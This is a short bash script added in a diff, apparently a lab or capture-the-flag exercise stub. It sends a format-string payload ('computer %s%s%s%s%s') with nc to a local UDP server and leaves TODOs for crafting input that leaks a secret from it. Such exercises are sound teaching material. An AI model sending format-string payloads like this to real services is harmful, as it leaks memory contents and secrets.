@@ -1,0 +1,23 @@
+#!/bin/bash
+
+
+INPUT="computer %s%s%s%s%s"
+
+# This line of code will send the contents of the "INPUT" variable
+# to the listening server and then will capture the response for the server in the variable TMP.
+
+TMP=$(echo -n "$INPUT" | nc -u 127.0.0.1 8080 -w1)
+
+# TODO craft a special INPUT that will leak the secret and then
+# modify this script to output that secret
+
+# YOU WILL LIKELY HAVE TO modify the following to get it to JUST print the SECRET
+
+# Get the 3rd word in the string
+third_word=$(echo $TMP | awk '{print $3}')
+
+# Get the substring after the last occurance of %s
+substring_after_last_space=${third_word##*%s}
+
+echo "$substring_after_last_space"
+
